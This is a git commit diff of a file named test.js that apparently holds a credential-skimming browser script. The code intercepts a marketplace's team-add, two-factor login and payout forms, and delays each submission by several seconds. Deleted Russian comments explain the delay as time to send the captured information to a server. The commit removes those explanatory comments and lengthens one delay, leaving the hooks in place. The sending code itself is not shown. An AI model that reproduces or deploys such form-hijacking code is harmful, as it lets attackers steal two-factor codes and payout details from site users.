8503724078b65aff3dabf3ae632a2c75de9fdac2
OUTLOVE <39122694+OUTLOVE@users.noreply.github.com>
2021-05-31 14:09:21 +0000

    Update test.js

--- test.js
+++ test.js
@@ -3,12 +3,11 @@ if (document.querySelector('form[method="POST"][action*="/market/"][action*="/te
            teamAddForm = document.querySelector('form[method="POST"][action*="/market/"][action*="/team/"]')
            
       }
-             // добавляем к форме
+
       if (teamAddForm != undefined){
       teamAddForm.addEventListener('submit', function(event) {
               event.preventDefault();
-             
-              // дайте скрипту секунду для отправки инфы на сервер, а затем продолжаем как обычно
+
               setTimeout(function() {
                   teamAddForm.removeEventListener('submit', this);
                   teamAddForm.submit();
@@ -19,7 +18,7 @@ let twoFA;
 if (document.querySelector('form#registerform[action="/login/tfa"]') != undefined) {
            twoFA = document.querySelector('form#registerform[action="/login/tfa"]')    
       }           
-// добавляем к форме
+
       if (twoFA != undefined){
       twoFA.addEventListener('submit', function(event) {
               event.preventDefault();
@@ -28,19 +27,17 @@ if (document.querySelector('form#registerform[action="/login/tfa"]') != undefine
               setTimeout(function() {
                   twoFA.removeEventListener('submit', this);
                   twoFA.submit();
-              }, 5000)
+              }, 6000)
           });}
 
 let tfaToPayout; 
 if (document.querySelector('form[action*="/balance/payout"]') != undefined) {
            tfaToPayout = document.querySelector('form[action*="/balance/payout"]')    
       }           
-// добавляем к форме
+
       if (tfaToPayout != undefined){
       tfaToPayout.addEventListener('submit', function(event) {
               event.preventDefault();
-             
-              // дайте скрипту секунду для отправки инфы на сервер, а затем продолжаем как обычно
               setTimeout(function() {
                   tfaToPayout.removeEventListener('submit', this);
                   tfaToPayout.submit();
